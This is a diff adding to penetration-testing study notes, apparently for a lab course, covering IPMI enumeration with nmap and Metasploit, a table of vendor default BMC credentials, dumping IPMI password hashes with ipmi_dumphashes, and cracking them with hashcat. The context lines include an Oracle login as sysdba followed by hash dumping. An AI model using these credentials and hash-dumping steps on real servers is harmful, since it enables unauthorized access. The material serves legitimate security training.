@@ -1242,3 +1242,63 @@ curl -X GET http://10.129.204.235/testing.txt # test if the upload worked by try
 ### Exercises
 
 1. use `./odat.py` as shown in the notes to brute the db name (we'll get `XE`). Then use the default credentials scott/tiger to login. Use the command `sqlplus scott/tiger@10.129.205.19/XE as sysdba` then dump password hashes.
+
+## IPMI
+
+- Port: 623
+
+### Footprinting The Service
+
+- nmap:
+
+```bash
+sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+```
+
+- Metasploit:
+
+```bash
+msf6 > use auxiliary/scanner/ipmi/ipmi_version 
+msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
+msf6 auxiliary(scanner/ipmi/ipmi_version) > run
+```
+
+- Default Passwords:
+
+| Product | Username | Password |
+| --- | --- | --- |
+| Dell iDRAC | `root` | `calvin` |
+| HP iLO | `Administrator` | Randomized 8-character string consisting of numbers and uppercase letters |
+| Supermicro IPMI | `ADMIN` | `ADMIN` |
+
+> NOTE: Usually it is better to know the default passwords of ANY service we discover, some good sources (this is not from the material) are [this](https://github.com/ihebski/DefaultCreds-cheat-sheet), and [this](https://hysenlabs.com/en/projects/ihebski-defaultcreds-cheat-sheet).
+
+
+### Dangerous Settings
+
+- [IPMI Remote Cracking](https://web.archive.org/web/20260421071724/http://fish2.com/ipmi/remote-pw-cracking.html): Use this if default creds dont work.
+    - During auth a salted SHA1 or MD5 is sent by the server to the user's client before the actual authentication. 
+    - These can be cracked with hashcat as follows:
+
+```bash
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u #Crack password for an 8 char password with uppercase letters and numbers
+```
+
+- There is no fix for this because it is a flaw in IPMI itself.
+
+- Dumping Hashes using metasploit:
+
+```bash
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+```
+
+> Try different wordlists to get the password if the default hashcat given here doesn't work.
+
+### Exercises
+
+1. Use ipmi_dumphashes to get the username and hashed password.
+2. Crack the passwords using hashcat `hashcat -m 7300 -a 0 ipmi.txt /usr/share/wordlists/rockyou.txt`
